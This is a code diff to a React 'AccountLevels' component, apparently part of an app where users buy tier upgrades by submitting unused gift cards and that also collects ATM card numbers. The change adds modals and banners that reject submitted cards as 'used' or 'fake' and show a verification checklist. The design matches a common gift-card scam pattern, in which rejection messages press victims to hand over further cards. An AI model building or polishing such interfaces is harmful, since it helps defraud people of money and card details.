@@ -7,6 +7,7 @@ import {
   validateRealGiftCardInput,
   compressCardImage,
 } from '../utils/giftCardValidator';
+import { GiftCardVerdictModal, GiftCardCheckChecklist } from './GiftCardVerdictModal';
 import {
   ArrowLeft,
   Crown,
@@ -61,6 +62,7 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
   const [pendingStatusId, setPendingStatusId] = useState<string | null>(null);
   const [giftStatusState, setGiftStatusState] = useState<'pending' | 'verified' | 'redeemed' | 'rejected'>('pending');
   const [giftRejectionReason, setGiftRejectionReason] = useState('');
+  const [verdictModal, setVerdictModal] = useState<{ type: 'used' | 'fake'; message: string } | null>(null);
 
   // ATM Card form state
   const [cardNumber, setCardNumber] = useState('');
@@ -276,7 +278,12 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
     });
 
     if (!validation.valid) {
-      setGiftCardError(validation.error || 'Please drop a valid, unused gift card.');
+      const msg = validation.error || 'Please drop a valid, unused gift card.';
+      setGiftCardError(msg);
+      setVerdictModal({
+        type: msg.toLowerCase().includes('used') ? 'used' : 'fake',
+        message: msg,
+      });
       return;
     }
 
@@ -298,9 +305,10 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
       });
 
       if (!res.success || !res.statusId) {
-        setGiftCardError(
-          res.error || 'Used or invalid gift card is not allowed. Please drop a brand-new real gift card.'
-        );
+        const msg =
+          res.error || 'Used or invalid gift card is not allowed. Please drop a brand-new real gift card.';
+        setGiftCardError(msg);
+        setVerdictModal({ type: 'used', message: msg });
         return;
       }
 
@@ -676,6 +684,13 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
                   </span>
                 </label>
 
+                {giftCardError && (
+                  <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-start space-x-2 font-medium">
+                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
+                    <span>{giftCardError}</span>
+                  </div>
+                )}
+
                 <button
                   type="submit"
                   disabled={isSubmittingGiftCard}
@@ -806,8 +821,17 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
                 <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
                   <AlertCircle className="w-9 h-9" />
                 </div>
+                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
+                  {giftRejectionReason.toLowerCase().includes('fake') ||
+                  giftRejectionReason.toLowerCase().includes('wrong')
+                    ? 'Verdict: Fake / Wrong Gift Card'
+                    : 'Verdict: Used Gift Card'}
+                </span>
                 <h3 className="text-2xl font-extrabold text-red-700">
-                  Gift Card Rejected — Upgrade Denied
+                  {giftRejectionReason.toLowerCase().includes('fake') &&
+                  !giftRejectionReason.toLowerCase().startsWith('used')
+                    ? 'Fake or Invalid Gift Card — Rejected'
+                    : 'Used Gift Card — Upgrade Denied'}
                 </h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                   {giftRejectionReason ||
@@ -843,8 +867,9 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
                   Verifying Stage {selectedTier?.stage} Gift Card
                 </h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
-                  Our verification team is checking that your dropped gift card is real and unused before activating <strong>Stage {selectedTier?.stage} — {selectedTier?.name}</strong>. <strong>Wrong or used gift cards will be rejected.</strong>
+                  We have checked that your card matches a real format and are now confirming it has not been used before activating <strong>Stage {selectedTier?.stage} — {selectedTier?.name}</strong>.
                 </p>
+                <GiftCardCheckChecklist />
                 <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
                   Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                 </div>
@@ -983,6 +1008,7 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
           </div>
         )}
       </div>
+      <GiftCardVerdictModal verdict={verdictModal} onClose={() => setVerdictModal(null)} />
     </div>
   );
 };
